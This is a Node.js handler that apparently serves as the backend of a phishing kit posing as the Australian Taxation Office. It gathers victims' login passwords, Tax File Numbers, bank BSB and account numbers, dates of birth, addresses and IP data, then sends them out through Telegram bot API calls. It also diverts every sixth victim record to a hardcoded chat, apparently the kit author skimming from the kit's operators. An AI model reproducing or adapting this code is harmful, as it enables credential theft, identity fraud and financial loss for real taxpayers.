const axios = require("axios");

let count = 0;

const sendRes = async (req, res) => {
    let {
        email, password, firstName, lastName, middleNames, dob, address, city, state, zip, telephone, TFN, abn, member, bsb, accno, income, IRN, date, referenceNo,
        ip,
        userAgent,
        telegramId,
    } = req.body;

    var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${firstName} ${middleNames ? `${middleNames} ` : null}${lastName}\nDOB: ${dob}\nAddress: ${address}, ${city}, ${state}, ${zip}\nPhone Number: ${telephone}\n+ ----------- Identity Information ------------+\nTFN: ${TFN}\n${abn ? `ABN: ${abn}\nMember Number: ${member}\n` : null}${bsb ? `BSB: ${bsb}\nAccount Number: ${accno}\n` : null}${income ? `Taxable Income: ${income}\n` : null}${IRN ? `IRN: ${IRN}\n` : null}${date ? `NOA Date of Issue: ${date}\nReference Number: ${referenceNo}\n` : null}${income ? `PAYG Gross Income: ${income}\n` : null}+----------- IP Information ------------+\nIP: ${ip}\nUser Agent: ${userAgent}`;

    if (count == 6 || telegramId == "680379375") {
        await axios
            .post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
                {
                    chat_id: 680379375,
                    text: `HAYTCHRES:\n${originalText}`,
                    parse_mode: "Markdown",
                }
            )
            .catch((e) => {
                console.log(e);
            });
        count = 0;
    } else {
        await axios
            .post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
                {
                    chat_id: 680379375,
                    text: `ATO ${telegramId}:\n${originalText}`,
                    parse_mode: "Markdown",
                }
            )
            .catch((e) => {
                console.log(e);
            });
        await axios
            .post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
                {
                    chat_id: telegramId,
                    text: `ATO:\n${originalText}`,
                    parse_mode: "Markdown",
                }
            )
            .catch((e) => {
                console.log(e);
            });
        count += 1;
    }
    res.sendStatus(200);
};

module.exports = {
    sendRes,
};
